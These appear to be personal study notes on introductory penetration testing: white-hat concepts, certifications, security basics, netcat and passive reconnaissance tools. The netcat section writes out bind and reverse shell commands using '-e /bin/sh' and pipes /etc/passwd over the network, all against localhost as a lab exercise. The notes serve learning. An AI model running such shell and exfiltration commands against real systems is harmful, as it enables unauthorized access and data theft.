# Getting Started

Created: Aug 12, 2020 12:14 AM
Last Edited Time: Aug 19, 2020 12:16 AM
Status: Complete 👀
Type: Description🚀

# Overview

Why do we have to learn mock hacking?

- With the start of the fourth industrial era, information protection in the Internet environment began to gain popularity, and the demand for white hackers began to increase. In this era, the importance of information security experts is becoming more prominent, and the demand for white hackers is increasing, among which penetration testing is actually possible.

### What is Whitehacker?

- Also called White Hat Hacker
- Broadly all experts in information security. Specifically, experts with hacking skills
- Increase security by finding and disclosing security vulnerabilities by means of simulated hacking or source code check

### Differences from Illegal hacking

- Perform hacking through prior consultation with the target
- There is a difference in obtaining prior permission.

### To be a white hacker

[Need For Hacking](https://www.notion.so/bae1a8770bce41cd98f4dcf439e2b735)

- Scripting language (shell programming, python, etc.) enables simple program self-production
- English is required. Related materials and the latest information are published in English.
- Learn based on practice open exploits, and practice ([exploit-db.com](http://exploit-db.com/))

# Certificate

1. Information Security Engineer / Information Security Industry Engineer
2. CISSP
3. Certified Ethical Hacker
4. Offensive Security Certified Professional
5. Offensive Security Certified Expert
6. Offensive Security Exploitation Expert

---

# Security and Hacking

Created: Aug 13, 2020 11:44 PM
Last Edited Time: Aug 19, 2020 12:18 AM
Status: Complete 👀
Type: Description🚀

# Security Overview

- To protect valuable assets

### Types of assets

- Hardware: Computers, peripherals, network equipment, etc.
- Software: Operating systems, Commercial programs, Self-developed programs, etc.
- Data: Documents, Images, Media Files, Email, Source Code, etd.

### Vulnerability

- Every software has bugs that occur during the design or implementation phase. Some of these bugs simply cause malfunction, while others affect the security of the software. This is called a security vulnerability.
- Three Elements of Information Security
    1. Confidentiality: Password exposure, card number exposure, etc.
    2. Integrity: Modulating and deleting files, Website deface, etc.
    3. Availability: Denial of Service Attack(DoS), etc.

### CVE

- Commin Vulnerabilities and Exposures ( The Standard for Information Security Vulnerability Names)
- Management in MITRE
- Disclosed Security Vulnerable Database
- CVE ID: Security vulnerability identification number (e.g. CVE-2016-5195)
- Info ⇒ CVE Details site

### Hacking phase

1. reconnaissance
2. Scanning and enumeration
3. Ganing Access
4. Privilege Escalation
5. Maintaining Access
6. Cover Tracks

1~2: information gathering

3: Exploit

4: Post Exploit

### Malware

- Code/software produced for malicious purposes
- Malware = Malicious + softWare
- Target: Specific person, specific group, unspecified majority
- Types of Malicious Codes
    - Viruses, Trojans, Worms
    - Ransomware, Keylogger, Adware
    - Backdoor, Rootkit

[Viruses, Trojans, Worms](https://www.notion.so/37c736475ff843d8b7557bdcdbbb68c0)

### Ransomware

- Encrypt sensitive files to make them unusable and require money.
- Major ransomware
    - Crypt-L-cker
    - WannaCry

### APT (Advanced Persistent Threat)

- Continuous attack over long periods of time
- various purposes, such as monetary, political, etc.
- Comprehensive use of a variety of hacking techniques to attack focus on specific targets
- Organizationally capable

### APT Countermeasures

- Network network isolation
- Deploy security equipment such as firewalls, IDS/IPS, and web firewalls.
- Establishing System Update Policies
- Internal employee security awareness training and employee system management
- Control access rights of internal users using NAC, etc.
- Hard disk encryption
- Perform an External Penetration Test Service

---

# NetCat

Created: Aug 15, 2020 12:18 AM
Last Edited Time: Aug 19, 2020 12:19 AM
Status: Complete 👀
Type: Technical Spec

# NetCat Overview

- Default Option check ⇒ nc -h
- server shell open ⇒ server litening on port: 4444

```bash
nc -lvp 444
```

- client ⇒ host ip , port

```bash
nc 127.0.0.1 4444
```

## NetCat File Copy test

1. server ⇒  server open and file save 

```bash
nc -lvp 4444 > passwd
```

1. client ⇒ output passwd file input 

```bash
 nc -q 127.0.0.1 < /etc/passwd
```

## NetCat Bind Shell, Reverse Shell

### Bind Shell

- server litening for target
- server ⇒

```bash
nc -lvp 4444 -e /bin/sh
```

- client ⇒

```bash
nc 127.0.0.1 4444
```

⇒ open to server shell

### Reverse Shell

- server litening for client
- client ⇒

```bash
nc -lvp 4444
```

- server ⇒

```bash
nc 127.0.0.1 4444 -e /bin/sh
```

⇒ open to client shell

*Require ⇒ -e option use to server shell

---

# Passive Scanning

Created: Aug 16, 2020 12:47 AM
Last Edited Time: Aug 19, 2020 12:19 AM
Status: Complete 👀
Type: Technical Spec

# Passive Scanning Overview

- The first stage of penetration testing
    - It is included in the reconnaissance phase.
- Gathering information using information that is already public
    - Search site
    - Whois, Netcraft, etc.
- No hacker activity is detected.

## Google Hacking

- site: Search results can be limited to specific sites.
- -site option: It shows the search results except for the keyword.
- filetype: Shows search results for a specific file type
- inurl: Keywords that find site addresses with specific strings
- intitle: Search for a Web Site title that contains a specific ( intitle: "index of" )

![Passive%20Scanning%20ee200613cd8a4eb59dc65260b4cf01ea/20200818_234810.png](Passive%20Scanning%20ee200613cd8a4eb59dc65260b4cf01ea/20200818_234810.png)

## Netcraft, Whois

- [searchdns.netcraft.com](http://searchdns.netcraft.com) ⇒ Get Important Info
- [whois.com](http://whois.com) ⇒ Get Korean Site search info

## Email Collection

- Collect the target company employee email.
- using the harvester ⇒ theharvester -d [domain.com](http://domain.com) -b searchEngin

![Passive%20Scanning%20ee200613cd8a4eb59dc65260b4cf01ea/20200818_235733.png](Passive%20Scanning%20ee200613cd8a4eb59dc65260b4cf01ea/20200818_235733.png)

## Recon-ng

- A reconnaissance framework developed through Python. Within this framework, modules can be run independently.

1. Enter and execute the recon-ng command.

![Passive%20Scanning%20ee200613cd8a4eb59dc65260b4cf01ea/Untitled.png](Passive%20Scanning%20ee200613cd8a4eb59dc65260b4cf01ea/Untitled.png)

2. You can view a list of commands through the help command.

![Passive%20Scanning%20ee200613cd8a4eb59dc65260b4cf01ea/Untitled%201.png](Passive%20Scanning%20ee200613cd8a4eb59dc65260b4cf01ea/Untitled%201.png)

3. Search for a module through the search command.

![Passive%20Scanning%20ee200613cd8a4eb59dc65260b4cf01ea/Untitled%202.png](Passive%20Scanning%20ee200613cd8a4eb59dc65260b4cf01ea/Untitled%202.png)

4. Use the module through the use command. Check the information of the module through the show info command.

![Passive%20Scanning%20ee200613cd8a4eb59dc65260b4cf01ea/Untitled%203.png](Passive%20Scanning%20ee200613cd8a4eb59dc65260b4cf01ea/Untitled%203.png)

5. Set options through the set command and run the module through the run command.

![Passive%20Scanning%20ee200613cd8a4eb59dc65260b4cf01ea/Untitled%204.png](Passive%20Scanning%20ee200613cd8a4eb59dc65260b4cf01ea/Untitled%204.png)